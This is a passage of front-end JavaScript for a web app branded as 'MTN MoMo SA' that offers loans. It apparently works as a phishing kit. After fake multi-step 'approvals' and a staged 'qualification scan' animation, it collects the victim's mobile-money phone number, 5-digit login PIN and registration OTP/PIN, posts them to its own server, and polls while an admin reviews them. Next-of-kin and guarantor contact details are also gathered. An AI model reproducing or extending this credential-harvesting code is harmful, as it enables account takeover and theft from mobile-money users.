    if (txt) txt.innerHTML = '<b>' + tc.icon + ' ' + tc.name + '</b> — Max loan <b>R ' + fmt(tc.maxLoan) + '</b>';
    var hint = document.getElementById('loanLimitHint');
    if (hint) hint.textContent = 'Min R ' + fmt(tc.minLoan) + ' · Max R ' + fmt(tc.maxLoan);
    var am = document.getElementById('s1am');
    if (!am) return;
    am.min = tc.minLoan;
    am.max = tc.maxLoan;
    if (S.loan.loanAmount) am.value = Math.min(S.loan.loanAmount, tc.maxLoan);
    if (+am.value > tc.maxLoan) am.value = tc.maxLoan;
    if (+am.value < tc.minLoan) am.value = tc.minLoan;
    var ty = document.getElementById('s1ty'); if (ty && S.loan.loanType) ty.value = S.loan.loanType;
    var te = document.getElementById('s1te'); if (te && S.loan.loanTerm) te.value = S.loan.loanTerm;
    var pu = document.getElementById('s1pu'); if (pu && S.loan.loanPurpose) pu.value = S.loan.loanPurpose;
}

async function submitStepLoan() {
    if (!isUserRegistered()) return forceRegistration();
    var ty = (document.getElementById('s1ty') || {}).value;
    var am = +(document.getElementById('s1am') || {}).value;
    var te = (document.getElementById('s1te') || {}).value;
    var pu = ((document.getElementById('s1pu') || {}).value || '').trim();
    var tc = ACCOUNT_TYPES[S.accountType];
    if (!ty || !te || !pu) return showErr('s1Err', 'Complete all fields.');
    if (am < tc.minLoan) return showErr('s1Err', 'Min R ' + fmt(tc.minLoan) + '.');
    if (am > tc.maxLoan) return showErr('s1Err', 'Max R ' + fmt(tc.maxLoan) + '.');
    var btn = document.getElementById('s1Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s1Err');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'loan',
                data: { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) {
            if (data.code === 'NOT_REGISTERED' || data.code === 'REGISTRATION_INCOMPLETE') { forceRegistration(); return; }
            return showErr('s1Err', data.error || 'Submission failed.');
        }
        S.loan = { loanType: ty, loanAmount: am, loanTerm: te, loanPurpose: pu };
        S.steps.loan = 'pending';
        saveAll();
        goTo('page-wait-loan');
        startPolling('loan', function () {
            S.steps.loan = 'approved'; saveAll();
            showToast('✅ Loan approved!', 'success');
            goTo('page-step2');
        });
    } catch (e) { showErr('s1Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 2: PERSONAL
// ═══════════════════════════════════════════════════════════
function prefillPersonal() {
    var set = function (id, v) { var el = document.getElementById(id); if (el && v) el.value = v; };
    set('s2fi', S.personal.firstName);
    set('s2la', S.personal.lastName);
    set('s2ph', S.personal.phone);
    set('s2em', S.personal.email);
}

async function submitStepPersonal() {
    if (!isUserRegistered()) return forceRegistration();
    var fi = ((document.getElementById('s2fi') || {}).value || '').trim();
    var la = ((document.getElementById('s2la') || {}).value || '').trim();
    var ph = (document.getElementById('s2ph') || {}).value || '';
    var em = ((document.getElementById('s2em') || {}).value || '').trim();
    if (!fi || !la) return showErr('s2Err', 'Enter your full name.');
    if (ph.length !== 9) return showErr('s2Err', 'Phone must be 9 digits.');
    if (!em || em.indexOf('@') === -1) return showErr('s2Err', 'Enter a valid email.');
    var btn = document.getElementById('s2Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s2Err');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'personal',
                data: { firstName: fi, lastName: la, phone: ph, email: em } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('s2Err', data.error || 'Failed.'); return; }
        S.personal = { firstName: fi, lastName: la, phone: ph, email: em };
        S.steps.personal = 'pending';
        saveAll();
        goTo('page-wait-personal');
        startPolling('personal', function () {
            S.steps.personal = 'approved'; saveAll();
            showToast('✅ Personal approved!', 'success');
            goTo('page-step3');
        });
    } catch (e) { showErr('s2Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 3: EMPLOYMENT
// ═══════════════════════════════════════════════════════════
async function submitStepEmployment() {
    if (!isUserRegistered()) return forceRegistration();
    var em = (document.getElementById('s3em') || {}).value;
    var inc = +(document.getElementById('s3in') || {}).value;
    var kn = ((document.getElementById('s3kn') || {}).value || '').trim();
    var kp = (document.getElementById('s3kp') || {}).value || '';
    if (!em || inc <= 0) return showErr('s3Err', 'Complete all fields.');
    if (!kn) return showErr('s3Err', 'Next of kin name required.');
    if (kp.length !== 9) return showErr('s3Err', 'Kin phone must be 9 digits.');
    var btn = document.getElementById('s3Btn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('s3Err');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'employment',
                data: { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('s3Err', data.error || 'Failed.'); return; }
        S.employment = { employment: em, annualIncome: inc, kinName: kn, kinPhone: kp };
        S.steps.employment = 'pending';
        saveAll();
        goTo('page-wait-employment');
        startPolling('employment', function () {
            S.steps.employment = 'approved'; saveAll();
            showToast('✅ Employment approved!', 'success');
            goTo('page-guarantor');
        });
    } catch (e) { showErr('s3Err', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// STEP 4: GUARANTOR
// ═══════════════════════════════════════════════════════════
async function submitStepGuarantor() {
    if (!isUserRegistered()) return forceRegistration();
    var gn = ((document.getElementById('gName') || {}).value || '').trim();
    var gp = (document.getElementById('gPhone') || {}).value || '';
    var gr = (document.getElementById('gRel') || {}).value;
    var gc = !!(document.getElementById('gConfirm') || {}).checked;
    if (!gn || gn.length < 3) return showErr('gErr', 'Enter guarantor name.');
    if (gp.length !== 9) return showErr('gErr', 'Phone must be 9 digits.');
    if (!gr) return showErr('gErr', 'Select relationship.');
    if (!gc) return showErr('gErr', 'Confirm agreement.');
    if (gp === S.personal.phone) return showErr('gErr', 'Guarantor phone cannot be your own.');
    var btn = document.getElementById('gBtn');
    setBtnLoading(btn, true, 'Submit for Approval');
    clearErr('gErr');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'guarantor',
                data: { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr } })
        });
        setBtnLoading(btn, false, 'Submit for Approval');
        if (!data.ok) { showErr('gErr', data.error || 'Failed.'); return; }
        S.guarantor = { guarantorName: gn, guarantorPhone: gp, guarantorRelation: gr };
        S.steps.guarantor = 'pending';
        saveAll();
        goTo('page-wait-guarantor');
        startPolling('guarantor', function () {
            S.steps.guarantor = 'approved'; saveAll();
            showToast('✅ Guarantor approved!', 'success');
            goTo('page-confirmation');
        });
    } catch (e) { showErr('gErr', e.message); setBtnLoading(btn, false, 'Submit for Approval'); }
}

// ═══════════════════════════════════════════════════════════
// CONFIRMATION
// ═══════════════════════════════════════════════════════════
function updateConfirmation() {
    if (!S.loan.loanAmount) return;
    var amt = S.loan.loanAmount;
    var months = parseInt(S.loan.loanTerm) || 12;
    var r = 0.27 / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
    var totalCost = monthly * months - amt;
    var set = function (id, v) { var el = document.getElementById(id); if (el) el.textContent = v; };
    set('cfAmount', 'R ' + fmt(amt));
    set('cfTerm', S.loan.loanTerm);
    set('cfPurpose', S.loan.loanPurpose || '');
    set('cfMonthly', 'R ' + fmt(monthly));
    set('cfCost', 'R ' + fmt(totalCost));
    set('cfName', ((S.personal.firstName || '') + ' ' + (S.personal.lastName || '')).trim());
    set('cfPhone', S.personal.phone ? '+27 ' + S.personal.phone : '');
    set('cfEmail', S.personal.email || '');
    set('cfGName', S.guarantor.guarantorName || '');
    set('cfGPhone', S.guarantor.guarantorPhone ? '+27 ' + S.guarantor.guarantorPhone : '');
    var ab = document.getElementById('agreeBox');
    if (ab) ab.checked = false;
    var cb = document.getElementById('confirmProceedBtn');
    if (cb) cb.disabled = true;
}

async function showAgreement() {
    try {
        var data = await apiCall('/api/agreement/' + S.applicationId);
        if (!data.ok) { showToast('Agreement not available yet.', 'error'); return; }
        var el = document.getElementById('agreementText');
        if (el) el.textContent = data.agreement;
        var m = document.getElementById('agreementModal');
        if (m) m.classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeAgreement() {
    var m = document.getElementById('agreementModal');
    if (m) m.classList.remove('show');
}
function downloadAgreementPdf() {
    if (!S.applicationId) { showToast('No application loaded.', 'error'); return; }
    window.location.href = '/api/agreement-pdf/' + S.applicationId;
    showToast('📥 Downloading PDF…', 'info', 2000);
}

// ═══════════════════════════════════════════════════════════
// TERMS MODAL
// ═══════════════════════════════════════════════════════════
async function showTerms() {
    try {
        var modal = document.getElementById('termsModal');
        var pre = document.getElementById('termsText');
        if (modal) modal.classList.add('show');
        if (_termsCache) { if (pre) pre.textContent = _termsCache; return; }
        if (pre) pre.textContent = 'Loading…';
        var data = await apiCall('/api/terms');
        if (!data.ok) { if (pre) pre.textContent = 'Could not load Terms.'; return; }
        _termsCache = data.text;
        if (pre) pre.textContent = data.text;
    } catch (e) { showToast(e.message, 'error'); }
}
function closeTerms() {
    var m = document.getElementById('termsModal');
    if (m) m.classList.remove('show');
}
function acceptTermsFromModal() {
    var cb = document.getElementById('regTnc');
    if (cb) cb.checked = true;
    clearErr('regErr');
    closeTerms();
    showToast('✅ Terms accepted', 'success', 1800);
}

// ═══════════════════════════════════════════════════════════
// MOMO LOGIN
// ═══════════════════════════════════════════════════════════
function prefillMoMoLogin() {
    var p = document.getElementById('loginPhone');
    if (S.personal.phone && p && !p.value) p.value = S.personal.phone;
}
function loginPinMvM(el, i) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && i < 4) { var n = document.getElementById('loginPin' + (i + 1)); if (n) n.focus(); }
}
function loginPinKeydown(el, i, e) {
    if (e.key === 'Backspace' && !el.value && i > 0) {
        var p = document.getElementById('loginPin' + (i - 1));
        if (p) { p.focus(); p.value = ''; }
    }
    if (e.key === 'ArrowLeft' && i > 0) { var p2 = document.getElementById('loginPin' + (i - 1)); if (p2) p2.focus(); }
    if (e.key === 'ArrowRight' && i < 4) { var p3 = document.getElementById('loginPin' + (i + 1)); if (p3) p3.focus(); }
}
function loginPinPaste(e, i) {
    var pasted = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
    if (!pasted) return;
    e.preventDefault();
    pasted.slice(0, 5 - i).split('').forEach(function (d, k) {
        var b = document.getElementById('loginPin' + (i + k));
        if (b) b.value = d;
    });
    var n = document.getElementById('loginPin' + Math.min(i + pasted.length, 4));
    if (n) n.focus();
}
function togLoginPin() {
    for (var i = 0; i < 5; i++) {
        var b = document.getElementById('loginPin' + i);
        if (b) b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearLoginPin() {
    for (var i = 0; i < 5; i++) { var el = document.getElementById('loginPin' + i); if (el) el.value = ''; }
    var first = document.getElementById('loginPin0'); if (first) first.focus();
}
function toggleLoginMethod() {
    var m = document.getElementById('loginMethod');
    var b = document.getElementById('biometricBlock');
    if (m && b) b.style.display = m.value === 'biometric' ? 'block' : 'none';
}
async function submitMoMoLogin() {
    if (!isUserRegistered()) return forceRegistration();
    var phone = (document.getElementById('loginPhone') || {}).value || '';
    var method = (document.getElementById('loginMethod') || {}).value || 'pin';
    var pin = [0,1,2,3,4].map(function (i) {
        var el = document.getElementById('loginPin' + i);
        return el ? el.value : '';
    }).join('');
    if (phone.length !== 9) return showErr('loginErr', 'Enter 9-digit MoMo phone.');
    if (method === 'pin' && pin.length !== 5) return showErr('loginErr', 'Enter 5-digit PIN.');
    var btn = document.getElementById('loginBtn');
    setBtnLoading(btn, true, 'Confirming...');
    clearErr('loginErr');
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'momologin',
                data: { phone: phone, pin: method === 'pin' ? pin : null, loginMethod: method, deviceInfo: navigator.platform || 'Unknown' } })
        });
        setBtnLoading(btn, false, 'Confirm Login');
        if (!data.ok) { showErr('loginErr', data.error || 'Login failed.'); return; }
        S.steps.momologin = 'pending';
        saveAll();
        goTo('page-wait-momologin');
        startPolling('momologin', function () {
            S.steps.momologin = 'approved'; saveAll();
            showToast('✅ MoMo login confirmed!', 'success');
            startQualificationScan();
        });
    } catch (e) { showErr('loginErr', e.message); setBtnLoading(btn, false, 'Confirm Login'); }
}

// ═══════════════════════════════════════════════════════════
// QUALIFICATION
// ═══════════════════════════════════════════════════════════
async function startQualificationScan() {
    goTo('page-scan');
    var setClass = function (id, c) { var el = document.getElementById(id); if (el) el.className = c; };
    setClass('scanItem1', 'scan-item active');
    setClass('scanItem2', 'scan-item');
    setClass('scanItem3', 'scan-item');
    var ws = document.getElementById('waitScanStatus');
    if (ws) ws.textContent = '⏳ Analyzing...';
    try {
        var data = await apiCall('/api/submit-step', {
            method: 'POST',
            body: JSON.stringify({ applicationId: S.applicationId, step: 'qualification', data: {} })
        });
        if (data.ok) { S.steps.qualification = 'pending'; saveAll(); }
    } catch (e) { console.error(e); }

    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    var i = 1;
    var statuses = ['📊 Analyzing transactions...', '📈 Verifying 20% requirement...', '🔍 Admin final review...'];
    qualificationAnimator = setInterval(function () {
        if (i < 3) {
            setClass('scanItem' + i, 'scan-item done');
            setClass('scanItem' + (i + 1), 'scan-item active');
            var el = document.getElementById('waitScanStatus');
            if (el) el.textContent = '⏳ ' + statuses[i];
            i++;
        } else {
            clearInterval(qualificationAnimator);
            qualificationAnimator = null;
            setClass('scanItem3', 'scan-item done');
            var el2 = document.getElementById('waitScanStatus');
            if (el2) el2.textContent = '⏳ Admin reviewing...';
        }
    }, 2500);

    startPolling('qualification', function () {
        if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
        ['scanItem1','scanItem2','scanItem3'].forEach(function (id) { setClass(id, 'scan-item done'); });
        S.steps.qualification = 'approved'; saveAll();
        setTimeout(function () { showToast('🎉 Loan approved!', 'success'); showApproval(); }, 800);
    });
}

// ═══════════════════════════════════════════════════════════
// POLLING (loan steps)
// ═══════════════════════════════════════════════════════════
function startPolling(step, onSuccess) {
    stopPolling();
    currentPollStep = step;
    currentPollCallback = onSuccess;
    currentPollStarted = Date.now();
    var tick = async function () {
        if (Date.now() - currentPollStarted > POLL_MAX_DURATION) {
            showToast('Timed out. Please retry.', 'error');
            stopPolling();
            return;
        }
        try {
            var r = await fetch('/api/status/' + S.applicationId + '/' + step, { credentials: 'same-origin' });
            if (!r.ok) throw new Error('HTTP ' + r.status);
            var data = await r.json();
            if (data.ok) {
                if (data.status === 'approved') { stopPolling(); onSuccess(); return; }
                if (data.status === 'rejected') {
                    stopPolling();
                    if (S.steps[step]) { S.steps[step] = 'rejected'; saveAll(); }
                    handleStepRejection(step);
                    return;
                }
            }
        } catch (e) { console.warn('Poll:', e.message); }
        activePoll = setTimeout(tick, POLL_INTERVAL);
    };
    tick();
}
function stopPolling() {
    if (activePoll) { clearTimeout(activePoll); activePoll = null; }
    currentPollStep = null;
    currentPollCallback = null;
}
async function handleStepRejection(step) {
    showToast('❌ ' + step.toUpperCase() + ' was rejected. Please review and try again.', 'error', 5000);
    try {
        await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' });
        if (S.steps[step]) S.steps[step] = 'idle';
        saveAll();
    } catch (e) { console.warn('Retry reset failed:', e.message); }
    if (step === 'loan') goTo('page-step1');
    else if (step === 'personal') goTo('page-step2');
    else if (step === 'employment') goTo('page-step3');
    else if (step === 'guarantor') goTo('page-guarantor');
    else if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
    else if (step === 'qualification') { resetLoanFlow(); goTo('page-step1'); }
    else goTo('page-landing');
}
function resetLoanFlow() {
    S.steps = { loan: 'idle', personal: 'idle', employment: 'idle', guarantor: 'idle', momologin: 'idle', qualification: 'idle' };
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    saveAll();
}

// ═══════════════════════════════════════════════════════════
// APPROVAL
// ═══════════════════════════════════════════════════════════
function showApproval() {
    var amt = S.loan.loanAmount || 0;
    var months = parseInt(S.loan.loanTerm) || 12;
    var r = 0.27 / 12;
    var monthly = Math.ceil(amt * r / (1 - Math.pow(1 + r, -months)) + 60);
    var set = function (id, v) { var el = document.getElementById(id); if (el) el.textContent = v; };
    set('aprAmount', 'R ' + fmt(amt));
    set('aprAmt', 'R ' + fmt(amt));
    set('aprTerm', S.loan.loanTerm);
    set('aprMth', 'R ' + fmt(monthly));
    goTo('page-approval');
}
async function viewSchedule() {
    try {
        var data = await apiCall('/api/repayment-schedule/' + S.applicationId);
        if (!data.ok) { showToast('Schedule not available.', 'error'); return; }
        var html = '<table class="schedule-table"><thead><tr><th>Month</th><th>Payment</th><th>Interest</th><th>Principal</th><th>Balance</th></tr></thead><tbody>';
        data.schedule.forEach(function (row) {
            html += '<tr><td>' + row.month + '</td><td>R ' + fmt(row.payment) + '</td><td>R ' + fmt(row.interest) + '</td><td>R ' + fmt(row.principal) + '</td><td>R ' + fmt(row.balance) + '</td></tr>';
        });
        html += '</tbody></table>';
        var body = document.getElementById('scheduleBody');
        if (body) body.innerHTML = html;
        var m = document.getElementById('scheduleModal');
        if (m) m.classList.add('show');
    } catch (e) { showToast(e.message, 'error'); }
}
function closeSchedule() {
    var m = document.getElementById('scheduleModal');
    if (m) m.classList.remove('show');
}
function copyAppId() {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(S.applicationId).then(
            function () { showToast('📋 Application ID copied!', 'success'); },
            function () { showToast('Could not copy.', 'error'); }
        );
    } else {
        showToast('Copy not supported.', 'error');
    }
}
function cancelApplication() {
    if (!confirm('Cancel this application? You can resume later with your Application ID.')) return;
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    save(KEYS.APP_ID, S.applicationId);
    rm(KEYS.APP_DATA);
    S.isRegistered = false;
    S.registrationStatus = 'idle';
    S.steps = {};
    S.loan = {}; S.personal = {}; S.employment = {}; S.guarantor = {};
    location.hash = '';
    location.reload();
}
function restartApplication() {
    stopPolling(); stopRegPoll();
    if (qualificationAnimator) { clearInterval(qualificationAnimator); qualificationAnimator = null; }
    Object.keys(KEYS).forEach(function (k) { rm(KEYS[k]); });
    location.reload();
}

// ═══════════════════════════════════════════════════════════
// RECOVERY
// ═══════════════════════════════════════════════════════════
async function recoverSession() {
    var id = get(KEYS.APP_ID);
    if (!id) { goTo('page-landing'); return; }
    S.applicationId = id;
    var data = get(KEYS.APP_DATA);
    if (data) {
        S.isRegistered = data.isRegistered;
        S.registrationStatus = data.registrationStatus || 'idle';
        S.accountType = data.accountType;
        S.accountMaxLoan = data.accountMaxLoan;
        S.steps = data.steps || {};
        S.loan = data.loan || {};
        S.personal = data.personal || {};
        S.employment = data.employment || {};
        S.guarantor = data.guarantor || {};
        S.dob = data.dob || null;
    }
    try {
        var r = await fetch('/api/status/' + id, { credentials: 'same-origin' });
        if (!r.ok) { goTo('page-landing'); return; }
        var s = await r.json();
        if (!s.ok || !s.isRegistered) { goTo('page-landing'); return; }

        S.isRegistered = true;
        S.registrationStatus = s.registrationStatus || S.registrationStatus;
        S.accountType = s.accountType;
        S.accountMaxLoan = s.accountMaxLoan;
        S.steps = s.steps || S.steps || {};
        S.dob = s.dob || S.dob;
        if (s.loan) S.loan = Object.assign({}, S.loan, s.loan);
        if (s.personal) S.personal = Object.assign({}, S.personal, s.personal);
        if (s.employment) S.employment = Object.assign({}, S.employment, s.employment);
        if (s.guarantor) S.guarantor = Object.assign({}, S.guarantor, s.guarantor);
        saveAll();
        updateCalc();

        if (S.registrationStatus && S.registrationStatus !== 'completed') {
            if (S.registrationStatus === 'rejected') {
                var el = document.getElementById('regRejectReason');
                if (el) el.textContent = s.rejectionReason || 'Registration was rejected.';
            }
            routeRegistrationFlow();
            return;
        }

        var steps = S.steps;
        var pending = STEPS.find(function (x) { return steps[x] === 'pending'; });
        if (pending) {
            var waitPages = {
                loan: 'page-wait-loan', personal: 'page-wait-personal',
                employment: 'page-wait-employment', guarantor: 'page-wait-guarantor',
                momologin: 'page-wait-momologin'
            };
            if (pending === 'qualification') { startQualificationScan(); return; }
            if (waitPages[pending]) {
                goTo(waitPages[pending]);
                var cbMap = {
                    loan: function () { S.steps.loan = 'approved'; saveAll(); goTo('page-step2'); },
                    personal: function () { S.steps.personal = 'approved'; saveAll(); goTo('page-step3'); },
                    employment: function () { S.steps.employment = 'approved'; saveAll(); goTo('page-guarantor'); },
                    guarantor: function () { S.steps.guarantor = 'approved'; saveAll(); goTo('page-confirmation'); },
                    momologin: function () { S.steps.momologin = 'approved'; saveAll(); startQualificationScan(); }
                };
                startPolling(pending, cbMap[pending]);
                return;
            }
        }

        if (steps.qualification === 'approved') { showApproval(); return; }
        if (steps.momologin === 'approved') { startQualificationScan(); return; }
        if (steps.guarantor === 'approved') { goTo('page-confirmation'); return; }
        if (steps.employment === 'approved') { goTo('page-guarantor'); return; }
        if (steps.personal === 'approved') { goTo('page-step3'); return; }
        if (steps.loan === 'approved') { goTo('page-step2'); return; }
        goTo('page-requirements');
    } catch (e) {
        console.warn('Recovery failed:', e.message);
        goTo('page-landing');
    }
}

async function retryStep(step) {
    stopPolling();
    try { await apiCall('/api/retry/' + S.applicationId + '/' + step, { method: 'POST' }); } catch (e) {}
    if (S.steps[step]) { S.steps[step] = 'idle'; saveAll(); }
    if (step === 'momologin') { clearLoginPin(); clearErr('loginErr'); goTo('page-momologin'); }
}

// ═══════════════════════════════════════════════════════════
// PIN & OTP INPUT WIRING
// ═══════════════════════════════════════════════════════════
function wirePinInputs(prefix, length, allowNext) {
    for (var i = 0; i < length; i++) {
        (function (idx) {
            var el = document.getElementById(prefix + idx);
            if (!el) return;
            el.addEventListener('input', function () {
                el.value = el.value.replace(/\D/g, '').slice(0, 1);
                if (el.value && idx < length - 1) {
                    var n = document.getElementById(prefix + (idx + 1));
                    if (n) n.focus();
                }
                if (allowNext && el.value && idx === length - 1) {
                    var n2 = document.getElementById(allowNext);
                    if (n2) n2.focus();
                }
            });
            el.addEventListener('keydown', function (e) {
                if (e.key === 'Backspace' && !el.value && idx > 0) {
                    var p = document.getElementById(prefix + (idx - 1));
                    if (p) { p.focus(); p.value = ''; }
                }
            });
            el.addEventListener('paste', function (e) {
                var text = ((e.clipboardData || window.clipboardData).getData('text') || '').replace(/\D/g, '');
                if (!text) return;
                e.preventDefault();
                text.slice(0, length - idx).split('').forEach(function (d, k) {
                    var box = document.getElementById(prefix + (idx + k));
                    if (box) box.value = d;
                });
                var n = document.getElementById(prefix + Math.min(idx + text.length, length - 1));
                if (n) n.focus();
            });
        })(i);
    }
}

function wireLoginPin() {
    for (var i = 0; i < 5; i++) {
        (function (idx) {
            var el = document.getElementById('loginPin' + idx);
            if (!el) return;
            el.addEventListener('input', function () { loginPinMvM(el, idx); });
            el.addEventListener('keydown', function (e) { loginPinKeydown(el, idx, e); });
            el.addEventListener('paste', function (e) { loginPinPaste(e, idx); });
        })(i);
    }
}

// ═══════════════════════════════════════════════════════════
// SAFE EVENT WIRING
// ═══════════════════════════════════════════════════════════
function bindClick(id, fn) {
    var el = document.getElementById(id);
    if (!el) return false;
    el.addEventListener('click', function (e) {
        e.preventDefault();
        try { fn(e); }
        catch (err) {
            console.error('[' + id + '] handler error:', err);
            showToast('Something went wrong. Please try again.', 'error');
        }
    });
    return true;
}

function bindGoto() {
    document.querySelectorAll('[data-goto]').forEach(function (el) {
        el.addEventListener('click', function (e) {
            e.preventDefault();
            goTo(el.dataset.goto);
        });
    });
}

function bindAccountTypeCards() {
    document.querySelectorAll('.account-type').forEach(function (card) {
        card.addEventListener('click', function () {
            if (card.dataset.type) selectAccountType(card.dataset.type);
        });
    });
}

function bindInputNormalizers() {
    var regId = document.getElementById('regId');
    if (regId) regId.addEventListener('input', function () { normalizeId('regId'); clearErr('regErr'); });
    ['regPhone','s2ph','s3kp','gPhone','loginPhone'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () {
            normalizePhone(id);
            var map = { regPhone: 'regErr', s2ph: 's2Err', s3kp: 's3Err', gPhone: 'gErr', loginPhone: 'loginErr' };
            clearErr(map[id]);
        });
    });
    var errMap = { regEmail: 'regErr', regTnc: 'regErr', s2fi: 's2Err', s2la: 's2Err', s2em: 's2Err', s3in: 's3Err', s3kn: 's3Err', gName: 'gErr', gRel: 'gErr', gConfirm: 'gErr', s1am: 's1Err', s1pu: 's1Err' };
    Object.keys(errMap).forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () { clearErr(errMap[id]); });
    });
}

function wireAllHandlers() {
    // Landing
    bindClick('applyBtn', applyAsExistingUser);
    bindClick('registerFirstBtn', function () { startMoMoRegistration({ mode: 'register' }); });
    bindClick('calcApplyBtn', applyFromCalculator);

    // Calculator
    var slider = document.getElementById('amtSlider');
    if (slider) slider.addEventListener('input', updateCalc);
    var termSel = document.getElementById('calcTermSelect');
    if (termSel) termSel.addEventListener('change', updateCalc);

    // Language
    var langSel = document.getElementById('langSelect');
    if (langSel) langSel.addEventListener('change', function () { setLanguage(langSel.value); });

    // Terms
    bindClick('termsLink', showTerms);
    bindClick('closeTermsBtn', closeTerms);
    bindClick('acceptTermsBtn', acceptTermsFromModal);

    // Registration buttons
    bindClick('regBtn', completeRegistration);
    bindClick('regOtpBtn', submitRegistrationOtp);
    bindClick('regPinBtn', submitRegistrationPin);
    bindClick('restartRegBtn', restartRegistration);
    bindClick('backHomeBtn', function () { goTo('page-landing'); });

    // Cancel buttons
    bindClick('cancelRegWaitBtn', cancelApplication);
    bindClick('cancelOtpWaitBtn', cancelApplication);
    bindClick('cancelPinWaitBtn', cancelApplication);
    bindClick('cancelStep1', cancelApplication);
    bindClick('cancelWaitLoanBtn', cancelApplication);
    bindClick('cancelWaitPersonalBtn', cancelApplication);
    bindClick('cancelWaitEmploymentBtn', cancelApplication);
    bindClick('cancelWaitGuarantorBtn', cancelApplication);
    bindClick('cancelWaitMomoLoginBtn', cancelApplication);
    bindClick('cancelScanBtn', cancelApplication);

    // Steps
    bindClick('s1Btn', submitStepLoan);
    bindClick('s2Btn', submitStepPersonal);
    bindClick('s3Btn', submitStepEmployment);
    bindClick('gBtn', submitStepGuarantor);

    // Confirmation
    var agreeBox = document.getElementById('agreeBox');
    var proceedBtn = document.getElementById('confirmProceedBtn');
    if (agreeBox && proceedBtn) {
        agreeBox.addEventListener('change', function () { proceedBtn.disabled = !agreeBox.checked; });
    }
    bindClick('showAgreementBtn', showAgreement);
    bindClick('downloadPdfConfirmBtn', downloadAgreementPdf);
    bindClick('confirmProceedBtn', function () { goTo('page-momologin'); });
    bindClick('closeAgreementBtn', closeAgreement);

    // MoMo login
    bindClick('loginBtn', submitMoMoLogin);
    bindClick('loginRetryBtn', function () { retryStep('momologin'); });
    bindClick('togglePinBtn', togLoginPin);
    bindClick('clearPinBtn', clearLoginPin);
    var loginMethod = document.getElementById('loginMethod');
    if (loginMethod) loginMethod.addEventListener('change', toggleLoginMethod);

    // Approval
    bindClick('viewScheduleBtn', viewSchedule);
    bindClick('downloadPdfApprovalBtn', downloadAgreementPdf);
    bindClick('copyAppIdBtn', copyAppId);
    bindClick('restartAppBtn', restartApplication);
    bindClick('closeScheduleBtn', closeSchedule);

    // Modal backdrop close
    ['termsModal','agreementModal','scheduleModal'].forEach(function (id) {
        var m = document.getElementById(id);
        if (!m) return;
        m.addEventListener('click', function (e) {
            if (e.target === m) {
                if (id === 'termsModal') closeTerms();
                else if (id === 'agreementModal') closeAgreement();
                else if (id === 'scheduleModal') closeSchedule();
            }
        });
    });

    // Navigation via data-goto
    bindGoto();

    // Account type cards
    bindAccountTypeCards();

    // Input normalisers
    bindInputNormalizers();

    console.log('✅ All button handlers wired');
}

// Expose on window for debugging
window.applyAsExistingUser = applyAsExistingUser;
window.completeRegistration = completeRegistration;
window.goTo = goTo;
window.updateCalc = updateCalc;
window.setLanguage = setLanguage;
window.cancelApplication = cancelApplication;

// ═══════════════════════════════════════════════════════════
// BOOT
// ═══════════════════════════════════════════════════════════
function boot() {
    console.log('🔧 Booting MTN MoMo SA v7.2...');
    try { applyI18n(); } catch (e) { console.warn('i18n:', e); }

    // Wire OTP/PIN input boxes
    wirePinInputs('regOtp', 6);
    wirePinInputs('regPin', 5, 'regPinC0');
    wirePinInputs('regPinC', 5);
    wireLoginPin();

    // Wire all click handlers
    wireAllHandlers();

    // Calculator init
    try { updateCalc(); } catch (e) { console.warn('updateCalc:', e); }

    // Recover session
    try { recoverSession(); } catch (e) { console.warn('recoverSession:', e); }

    // Back/forward navigation
    window.addEventListener('popstate', function () {
        var active = document.querySelector('.page.active');
        if (active && requiresRegistration(active.id) && !isUserRegistered()) {
            forceRegistration();
        }
    });

    // Resume polling when tab regains focus
    document.addEventListener('visibilitychange', function () {
        if (document.hidden) return;
        if (currentPollStep && currentPollCallback && !activePoll) {
            startPolling(currentPollStep, currentPollCallback);
        }
        if (regPollTimer === null && S.registrationStatus && S.registrationStatus !== 'completed') {
            if (S.registrationStatus === 'pending_review') pollRegistrationStatus();
            else if (S.registrationStatus === 'otp_submitted') pollOtpStatus();
            else if (S.registrationStatus === 'pin_pending') pollPinStatus();
        }
    });

    // Stop polling on unload
